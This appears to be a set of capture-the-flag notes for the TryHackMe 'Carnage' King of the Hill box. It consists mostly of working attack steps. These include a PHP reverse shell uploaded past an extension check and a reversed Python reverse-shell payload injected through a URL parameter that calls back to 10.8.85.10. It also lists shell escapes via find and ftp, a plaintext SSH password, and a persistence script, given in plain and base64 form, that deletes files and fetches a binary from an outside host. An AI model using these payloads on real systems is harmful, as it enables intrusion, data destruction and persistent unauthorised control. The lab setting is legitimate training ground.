# Carnage
## Method 1
1. Goto http://carnage.thm:82
2. Generate php shell with .gif extension
3. Upload reverse shell and intercept with burpsuite.
4. Change extension to .php
5. http://carnage.thm:82/images
6. cd `/var/www/html/web1` and read web.db

*You can pass these steps and ssh to bobba with ````bobba : -`G)8(t/NDkZ"u^{````*

9. login as `bobba`
10. `find . -exec /bin/sh \; -quit`
## Method 2
1. http://carnage.thm//3ef043d9e9c5d19b9db6d87c6f23b290/dice.php?action=metsys&text=di
2. *Command must be reversed*
3. http://carnage.thm//3ef043d9e9c5d19b9db6d87c6f23b290/dice.php?action=metsys&text=')"hsab"(nwaps.ytp ;ytp tropmi;)2,)(onelif.s(2pud.so;)1,)(onelif.s(2pud.so ;)0,)(onelif.s(2pud.so;))8888,"01.58.8.01"((tcennoc.s;)MAERTS_KCOS.tekcos,TENI_FA.tekcos(tekcos.tekcos=s;so,ssecorpbus,tekcos tropmi' c- 3nohtyp
## Method 3
1. Login SSH via duku_rsa
2. ` /usr/bin/netkit-ftp` and `!/bin/sh`

# Notes
There is no chattr and king.txt file is only append file.
So script.sh for Carnage:
```
rm -rf $(which chattr)
clear_tmp(){
cd /tmp
rm -rf *
}
get_chattr(){
     cd /dev/shm
     wget 10.8.85.10/chattr
     mv chattr asd
     chmod 100 asd
}
get_chattr
while true; do
     if ls -l /dev/shm/asd
          then
               echo OK
          else
               get_chattr
          	echo DONE
     fi
     if ls -l /tmp
          then
               clear_tmp
     fi
     /dev/shm/asd -ia /root > /dev/null
     /dev/shm/asd -ia /root/king.txt >/dev/null
     chmod 600 /root/king.txt
     echo -n "lomarkomar" >> /root/king.txt >/dev/null
     chmod 200 /root/king.txt
     /dev/shm/asd +ia /root/king.txt >/dev/null
     /dev/shm/asd +ia /root >/dev/null
done
```
Base64 Endcoded Version:
```
echo cm0gLXJmICQod2hpY2ggY2hhdHRyKQpjbGVhcl90bXAoKXsKY2QgL3RtcApybSAtcmYgKgp9CmdldF9jaGF0dHIoKXsKICAgICBjZCAvZGV2L3NobQogICAgIHdnZXQgMTAuOC44NS4xMC9jaGF0dHIKICAgICBtdiBjaGF0dHIgYXNkCiAgICAgY2htb2QgMTAwIGFzZAp9CmdldF9jaGF0dHIKd2hpbGUgdHJ1ZTsgZG8KICAgICBpZiBscyAtbCAvZGV2L3NobS9hc2QKICAgICAgICAgIHRoZW4KICAgICAgICAgICAgICAgZWNobyBPSwogICAgICAgICAgZWxzZQogICAgICAgICAgICAgICBnZXRfY2hhdHRyCiAgICAgICAgICAJZWNobyBET05FCiAgICAgZmkKICAgICBpZiBscyAtbCAvdG1wCiAgICAgICAgICB0aGVuCiAgICAgICAgICAgICAgIGNsZWFyX3RtcAogICAgIGZpCiAgICAgL2Rldi9zaG0vYXNkIC1pYSAvcm9vdCA+IC9kZXYvbnVsbAogICAgIC9kZXYvc2htL2FzZCAtaWEgL3Jvb3Qva2luZy50eHQgPi9kZXYvbnVsbAogICAgIGNobW9kIDYwMCAvcm9vdC9raW5nLnR4dAogICAgIGVjaG8gLW4gImxvbWFya29tYXIiID4+IC9yb290L2tpbmcudHh0ID4vZGV2L251bGwKICAgICBjaG1vZCAyMDAgL3Jvb3Qva2luZy50eHQKICAgICAvZGV2L3NobS9hc2QgK2lhIC9yb290L2tpbmcudHh0ID4vZGV2L251bGwKICAgICAvZGV2L3NobS9hc2QgK2lhIC9yb290ID4vZGV2L251bGwKZG9uZQ== |base64 -d | sh&
```

## Flags

```/home/bobba/flag1.txt (rot13)```

```/home/yoda/flag2.txt (hex)```

```/home/duku/flag3.txt```

```/root/flag4.txt```

```/var/www/html/web1/web.db```

```/var/www/html/web2/flag.txt```

```/var/www/html/web3/flag.txt```

